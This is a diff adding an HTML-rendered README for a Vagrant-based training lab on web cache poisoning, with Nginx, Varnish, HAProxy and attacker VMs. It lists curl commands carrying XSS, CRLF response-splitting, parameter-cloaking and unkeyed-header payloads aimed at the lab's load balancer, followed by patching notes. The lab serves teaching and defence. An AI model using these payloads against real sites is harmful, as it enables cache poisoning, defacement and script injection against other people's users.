@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+        <html>
+        <head>
+            <meta charset="UTF-8">
+            <title>Aboiye-DevSecOps-Projects</title>
+            <style>
+/* From extension vscode.github */
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+.vscode-dark img[src$=\#gh-light-mode-only],
+.vscode-light img[src$=\#gh-dark-mode-only],
+.vscode-high-contrast:not(.vscode-high-contrast-light) img[src$=\#gh-light-mode-only],
+.vscode-high-contrast-light img[src$=\#gh-dark-mode-only] {
+	display: none;
+}
+
+</style>
+            
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/markdown.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Microsoft/vscode/extensions/markdown-language-features/media/highlight.css">
+<style>
+            body {
+                font-family: -apple-system, BlinkMacSystemFont, 'Segoe WPC', 'Segoe UI', system-ui, 'Ubuntu', 'Droid Sans', sans-serif;
+                font-size: 14px;
+                line-height: 1.6;
+            }
+        </style>
+        <style>
+.task-list-item {
+    list-style-type: none;
+}
+
+.task-list-item-checkbox {
+    margin-left: -20px;
+    vertical-align: middle;
+    pointer-events: none;
+}
+</style>
+<style>
+:root {
+  --color-note: #0969da;
+  --color-tip: #1a7f37;
+  --color-warning: #9a6700;
+  --color-severe: #bc4c00;
+  --color-caution: #d1242f;
+  --color-important: #8250df;
+}
+
+</style>
+<style>
+@media (prefers-color-scheme: dark) {
+  :root {
+    --color-note: #2f81f7;
+    --color-tip: #3fb950;
+    --color-warning: #d29922;
+    --color-severe: #db6d28;
+    --color-caution: #f85149;
+    --color-important: #a371f7;
+  }
+}
+
+</style>
+<style>
+.markdown-alert {
+  padding: 0.5rem 1rem;
+  margin-bottom: 16px;
+  color: inherit;
+  border-left: .25em solid #888;
+}
+
+.markdown-alert>:first-child {
+  margin-top: 0
+}
+
+.markdown-alert>:last-child {
+  margin-bottom: 0
+}
+
+.markdown-alert .markdown-alert-title {
+  display: flex;
+  font-weight: 500;
+  align-items: center;
+  line-height: 1
+}
+
+.markdown-alert .markdown-alert-title .octicon {
+  margin-right: 0.5rem;
+  display: inline-block;
+  overflow: visible !important;
+  vertical-align: text-bottom;
+  fill: currentColor;
+}
+
+.markdown-alert.markdown-alert-note {
+  border-left-color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-note .markdown-alert-title {
+  color: var(--color-note);
+}
+
+.markdown-alert.markdown-alert-important {
+  border-left-color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-important .markdown-alert-title {
+  color: var(--color-important);
+}
+
+.markdown-alert.markdown-alert-warning {
+  border-left-color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-warning .markdown-alert-title {
+  color: var(--color-warning);
+}
+
+.markdown-alert.markdown-alert-tip {
+  border-left-color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-tip .markdown-alert-title {
+  color: var(--color-tip);
+}
+
+.markdown-alert.markdown-alert-caution {
+  border-left-color: var(--color-caution);
+}
+
+.markdown-alert.markdown-alert-caution .markdown-alert-title {
+  color: var(--color-caution);
+}
+
+</style>
+        
+        </head>
+        <body class="vscode-body vscode-light">
+            <h1 id="aboiye-devsecops-projects">Aboiye-DevSecOps-Projects</h1>
+<p>Documentation for my DevSecOps Projects</p>
+<h2 id="cache-poisoning-lab">Cache Poisoning Lab</h2>
+<p>This project is a Vagrant-based local lab designed to explore cache poisoning vulnerabilities, exploit them, and learn how to patch them. It simulates a web application stack with a web server, caching server, load balancer, and attacker machine, providing hands-on experience with cybersecurity concepts like cache key manipulation, HTTP response splitting, and parameter cloaking.</p>
+<h2 id="project-overview">Project Overview</h2>
+<p>The lab replicates a realistic web stack to study cache poisoning:</p>
+<ul>
+<li><strong>Web Server</strong>: Nginx serving static and dynamic content.</li>
+<li><strong>Caching Server</strong>: Varnish as a reverse proxy with caching capabilities.</li>
+<li><strong>Load Balancer</strong>: HAProxy distributing traffic.</li>
+<li><strong>Attacker Machine</strong>: A VM for simulating attacks.</li>
+<li><strong>Victim Client</strong>: Your host machine to observe the effects.</li>
+</ul>
+<p>The setup intentionally introduces vulnerabilities, demonstrates exploitation techniques, and then applies patches to secure the environment.</p>
+<h2 id="topology">Topology</h2>
+<p>Below is the network topology of the lab:</p>
+<pre><code class="language-mermaid">graph TD
+    subgraph Internet[Internet]
+        VC[Victim Client&lt;br&gt;Your Host]:::client
+        AM[Attacker Machine&lt;br&gt;192.168.50.40]:::attacker
+    end
+    VC --&gt;|HTTP Requests| LB[Load Balancer Tier&lt;br&gt;HAProxy&lt;br&gt;192.168.50.30]:::loadbalancer
+    AM --&gt;|Malicious Requests| LB
+    LB --&gt; CS[Caching Tier&lt;br&gt;Varnish&lt;br&gt;192.168.50.20]:::cache
+    CS --&gt; WS[Application Tier&lt;br&gt;Nginx Web Server&lt;br&gt;192.168.50.10]:::webserver
+
+    classDef client fill:#f9f,stroke:#333,stroke-width:2px;
+    classDef attacker fill:#fdd,stroke:#f00,stroke-width:2px;
+    classDef loadbalancer fill:#bbf,stroke:#333,stroke-width:2px;
+    classDef cache fill:#bfb,stroke:#333,stroke-width:2px;
+    classDef webserver fill:#bfb,stroke:#333,stroke-width:2px;
+</code></pre>
+<h2 id="prerequisites">Prerequisites</h2>
+<p>Vagrant
+VirtualBox (or another Vagrant provider)
+Basic knowledge of Linux, networking, and HTTP</p>
+<h2 id="setup-instructions">Setup Instructions</h2>
+<p>Clone the Repository:</p>
+<pre><code class="language-bash">git <span class="hljs-built_in">clone</span> &lt;git@github.com&gt;:Abwonder/Aboiye-DevSecOps-Projects.git
+<span class="hljs-built_in">cd</span> cache-poisoning-lab
+</code></pre>
+<p>Start the Lab:</p>
+<pre><code class="language-bash">vagrant up
+</code></pre>
+<p>This provisions four VMs: web, cache, lb, and attacker.
+Access the Components:
+Web Server: 192.168.50.10
+Caching Server: 192.168.50.20
+Load Balancer: 192.168.50.30 (entry point)
+Attacker: 192.168.50.40</p>
+<p>Usage
+Exploring Vulnerabilities</p>
+<p>Cache Key Manipulation:
+From the attacker VM: curl -H &quot;Host: <a href="http://example.com">example.com</a>&quot; &quot;<a href="http://192.168.50.30/dynamic.php?user=">http://192.168.50.30/dynamic.php?user=</a><script>alert('Hacked')</script>&quot;
+Test as victim: curl <a href="http://192.168.50.30/dynamic.php">http://192.168.50.30/dynamic.php</a>
+HTTP Response Splitting:
+curl -H &quot;Host: <a href="http://example.com">example.com</a>&quot; &quot;<a href="http://192.168.50.30/dynamic.php?user=Alice%0d%0aContent-Length:%200%0d%0a%0d%0a">http://192.168.50.30/dynamic.php?user=Alice
+Content-Length: 0
+
+</a><h1>Defaced!</h1>&quot;
+Parameter Cloaking:
+curl -H &quot;Host: <a href="http://example.com">example.com</a>&quot; &quot;<a href="http://192.168.50.30/dynamic.php?user=Normal;user=">http://192.168.50.30/dynamic.php?user=Normal;user=</a><script>alert('XSS')</script>&quot;
+Unkeyed Headers:
+curl -H &quot;Host: <a href="http://example.com">example.com</a>&quot; -H &quot;Accept-Encoding: gzip&quot; &quot;<a href="http://192.168.50.30/dynamic.php?user=">http://192.168.50.30/dynamic.php?user=</a><h1>Poisoned</h1>&quot;</p>
+<p>Patching Vulnerabilities</p>
+<p>Re-provision VMs with updated configs:</p>
+<pre><code class="language-bash">
+vagrant provision web
+vagrant provision cache
+vagrant provision lb
+</code></pre>
+<p>Retest attacks to verify fixes (see configuration details in the Vagrantfile).</p>
+<p>Files</p>
+<p>Vagrantfile: Defines and provisions the VMs with initial vulnerable configs and patched versions.
+<a href="http://README.html">README.md</a>: This file.</p>
+<h2 id="learning-objectives">Learning Objectives</h2>
+<p>Understand how caching works in a web stack.
+Exploit common cache poisoning techniques.
+Implement mitigations like input sanitization, cache key normalization, and header validation.</p>
+<h2 id="patching-details">Patching Details</h2>
+<p>Nginx: Sanitizes input with htmlspecialchars and adds Cache-Control: no-store.
+Varnish: Keys on headers, skips caching dynamic content, respects backend cache directives.
+HAProxy: Rejects malformed headers and rate-limits requests.</p>
+<p>Contributing</p>
+<p>Feel free to fork this repo, enhance the lab (e.g., add CDN caching), and submit pull requests!
+License</p>
+<p>MIT License - feel free to use and modify this lab for educational purposes.</p>
+
+            
+            
+        </body>
+        </html>
